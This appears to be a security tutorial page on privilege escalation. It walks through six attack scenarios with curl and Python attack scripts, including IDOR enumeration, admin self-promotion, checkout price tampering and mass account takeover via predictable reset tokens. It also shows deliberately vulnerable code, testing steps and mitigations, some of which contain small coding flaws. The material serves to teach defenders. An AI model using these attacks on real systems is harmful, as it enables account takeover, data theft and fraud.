# Privilege Escalation and Trust Boundaries

## Real-World Attack Scenarios

#### Scenario 1: Horizontal Privilege Escalation - User Enumeration

An API endpoint allows viewing user profiles by ID:

```http
GET /api/user/123 → Returns user 123's profile
GET /api/user/124 → Returns user 124's profile
```

**The vulnerability:**

No authorization check - any user can access any profile by changing the ID.

**The attack:**

```bash
# Enumerate all users
for i in {1..1000}; do
  curl -H "Authorization: Bearer mytoken" http://example.com/api/user/$i
done

# Collect all user data:
# - Email addresses
# - Phone numbers
# - Physical addresses
# - Payment information
# - Personal information
```

**Result:**

* Complete user database disclosure
* Privacy violation
* GDPR/CCPA breach

**Finding it:** Change IDs in requests. Test if you can access other users' data without authentication.

***

#### Scenario 2: Vertical Privilege Escalation - Role Change

An admin panel allows modifying user roles without proper authorization:

```http
POST /admin/user/42/role
data: {"role": "admin"}
```

**The vulnerability:**

No authorization check - any authenticated user can promote themselves to admin.

**The attack:**

```bash
# As regular user, promote yourself
curl -X POST \
  -H "Authorization: Bearer mytoken" \
  -d '{"role": "admin"}' \
  http://example.com/admin/user/42/role

# Now you're admin
# Access admin panel
curl -H "Authorization: Bearer mytoken" http://example.com/admin
# Success!
```

**Result:**

* Admin access achieved
* Complete system control
* Can modify any data, delete accounts, access secrets

**Finding it:** Look for user/role modification endpoints. Try changing your own role. Check if authorization checked.

***

#### Scenario 3: Trust Boundary Violation - Hidden Parameter

An order form has a hidden price field:

```html
<form method="POST" action="/checkout">
  <input type="hidden" name="total_price" value="99.99">
  <input type="hidden" name="discount" value="0.00">
  <button type="submit">Checkout</button>
</form>
```

**The vulnerability:**

Application trusts hidden fields without re-validation:

```php
// VULNERABLE - Trusts client-provided price
$total = $_POST['total_price'];
$discount = $_POST['discount'];
$final_price = $total - $discount;
ProcessPayment($final_price);
```

**The attack:**

Attacker modifies hidden fields in browser:

```http
total_price=99.99 → total_price=0.01
discount=0.00 → discount=99.98
```

Or intercepts request with Burp Suite and modifies:

```http
POST /checkout
total_price=0.01&discount=0.00&product_id=1
```

**Result:**

* Products purchased for penny
* Massive financial loss
* Fraud

**Finding it:** Intercept POST requests. Modify prices, quantities, discounts. Check if values re-validated server-side.

***

#### Scenario 4: Improper Privilege Management - Missing Authorization Check

A resource deletion endpoint doesn't check ownership:

```python
@app.route('/delete-document/<doc_id>', methods=['POST'])
def delete_document(doc_id):
    # VULNERABLE - No ownership check!
    Document.query.filter_by(id=doc_id).delete()
    db.session.commit()
    return "Document deleted"
```

**The vulnerability:**

No authorization check - any authenticated user can delete any document.

**The attack:**

```bash
# Delete other users' documents
curl -X POST \
  -H "Authorization: Bearer mytoken" \
  http://example.com/delete-document/999

# Attacker can delete anyone's documents
# Perform denial of service
# Destroy other users' data
```

**Result:**

* Document loss
* Denial of service
* Data destruction

**Finding it:** Find resource deletion endpoints. Try deleting resources belonging to other users.

***

#### Scenario 5: Client-Side Security Enforcement Only

A page has admin buttons that are hidden from regular users:

```javascript
// JavaScript on client
if (user.role === 'admin') {
    document.getElementById('admin-button').style.display = 'block';
}
```

**The vulnerability:**

Authorization only checked on client - server doesn't validate role.

**The attack:**

Attacker:

1. Opens browser console
2. Removes the if condition
3. Shows admin button
4. Clicks it
5. Browser makes request to admin endpoint

Server doesn't check authorization and processes the request.

```javascript
// In browser console
document.getElementById('admin-button').style.display = 'block';
// Button appears

// Click button → makes admin request
// Server processes it without checking authorization
```

**Result:**

* Admin actions performed by non-admin
* Unauthorized data modification
* System compromise

**Finding it:** Check if admin features hidden with CSS/JavaScript. Test if backend endpoint checks authorization. Use Burp Suite to craft admin requests.

***

#### Scenario 6: Incorrect User Management - Account Takeover

A password reset function uses predictable tokens:

```python
def generate_reset_token(user_id):
    # VULNERABLE - Token based on user_id
    return hashlib.md5(str(user_id).encode()).hexdigest()

def verify_reset_token(user_id, token):
    expected_token = hashlib.md5(str(user_id).encode()).hexdigest()
    return token == expected_token
```

**The vulnerability:**

Reset tokens are predictable and reusable for any user:

* User 1: token = md5(1)
* User 2: token = md5(2)
* Attacker can calculate tokens for any user

**The attack:**

```python
# Calculate reset tokens for all users
for user_id in range(1, 1000):
    token = hashlib.md5(str(user_id).encode()).hexdigest()
    # Try password reset with this token
    response = requests.post(
        'http://example.com/reset-password',
        data={
            'user_id': user_id,
            'token': token,
            'new_password': 'hacked123'
        }
    )
    if response.status_code == 200:
        print(f"Reset successful for user {user_id}")

# Result: All user passwords reset to attacker's password
```

**Result:**

* Takeover of all accounts
* Complete system compromise

**Finding it:** Request password reset. Check if token is randomness. Try using token for multiple users.

***

### How to Identify Access Control Issues During Testing

**1. Test horizontal privilege escalation**

Change IDs/usernames in requests:

```http
/profile/john → /profile/admin
/user/123 → /user/999
```

Try accessing other users' data.

**2. Test vertical privilege escalation**

Look for admin features. Try accessing them as non-admin:

```html
/admin/users
/admin/settings
/admin/reports
```

Try modifying your own role/privileges.

**3. Test trust boundaries**

Intercept requests. Modify:

* Prices
* Quantities
* User IDs
* Roles
* Permissions

Check if server re-validates.

**4. Test authorization checks**

For each endpoint:

* Is authorization checked?
* Does it check ownership?
* Can you access other users' resources?
* Can you escalate privileges?

**5. Check client-side enforcement**

Look for:

* JavaScript hiding features
* CSS displaying/hiding buttons
* Client-side role checks
* Try removing client-side restrictions

**6. Test with different roles**

Log in as:

* Admin
* Regular user
* Guest

Try accessing same resource with each role.

***

### Mitigation Strategies

**Always check authorization on server**

```python
@app.route('/user/<user_id>')
def get_user(user_id):
    # Check authorization
    if session['user_id'] != user_id and session['role'] != 'admin':
        return "Unauthorized", 403
    
    return User.query.get(user_id)
```

**Validate resource ownership**

```python
@app.route('/delete-document/<doc_id>', methods=['POST'])
def delete_document(doc_id):
    doc = Document.query.get(doc_id)
    
    # Check if user owns document
    if doc.owner_id != session['user_id']:
        return "Unauthorized", 403
    
    db.session.delete(doc)
    db.session.commit()
    return "Deleted"
```

**Never trust client input for authorization**

```python
# Bad
role = request.form.get('role')  # Client-provided role!

# Good
role = session.get('role')  # From server session
```

**Re-validate sensitive parameters**

```python
@app.route('/checkout', methods=['POST'])
def checkout():
    product_id = request.form.get('product_id')
    quantity = request.form.get('quantity')
    
    # ALWAYS fetch price from database
    product = Product.query.get(product_id)
    price = product.price  # Don't use client price!
    
    total = price * quantity
    ProcessPayment(total)
```

**Use proper authorization models**

* Role-based access control (RBAC)
* Attribute-based access control (ABAC)
* Access control lists (ACL)

```python
def require_admin(f):
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        if session.get('role') != 'admin':
            return "Forbidden", 403
        return f(*args, **kwargs)
    return decorated

@app.route('/admin')
@require_admin
def admin_panel():
    return render_template('admin.html')
```

**Enforce least privilege**

* Give users minimum permissions needed
* Disable unnecessary features
* Restrict API access
* Limit data exposure

***

&#123;% embed url="<https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README>" %}

&#123;% embed url="<https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html>" %}

&#123;% embed url="<https://cwe.mitre.org/data/definitions/266.html>" %}
